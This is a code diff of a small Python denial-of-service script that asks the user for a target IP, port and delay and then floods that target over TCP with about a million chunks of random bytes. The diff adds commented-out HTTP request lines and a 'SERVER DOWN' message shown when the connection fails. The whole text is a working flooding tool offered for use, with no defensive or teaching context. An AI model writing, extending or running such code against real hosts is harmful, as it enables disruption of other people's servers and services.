@@ -21,8 +21,11 @@ ___________.__           ________          __   _______          __         ___
 
                     """
 
+#attack_pack = 0
 
 def dos():
+    os.system("clear")
+
     try:
 
         try:
@@ -30,19 +33,27 @@ def dos():
             print(title)
 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
             target = input("target IP (like 127.0.0.1 ecc...): ")
             port = int(input("target PORT: "))
             sleep = float(input("sleap TIME: "))
 
             s.connect((target, port))
+            
+            try:
 
-            for i in range(1, 100*10000):
+                for i in range(1, 100*10000):
 
-                s.send(random._urandom(10)*10000)
-                print(f"Sent {i} packets", end='\r')
+                    #r = requests.get(target + "10000000000")
+                    #rp = requests.post(target + "10das2ijd")
+                    #effective_request = r = requests.get(host + "some words")
+                    s.send(random._urandom(10)*10000)
+                    print(f"Sent {i} packets", end='\r')
 
-                time.sleep(sleep)
+                    time.sleep(sleep)
+
+            except:
+                delay_print("SERVER DOWN\n")
+                sys.exit()
 
         except IOError as e:
             if e.errno == errno.EPIPE:
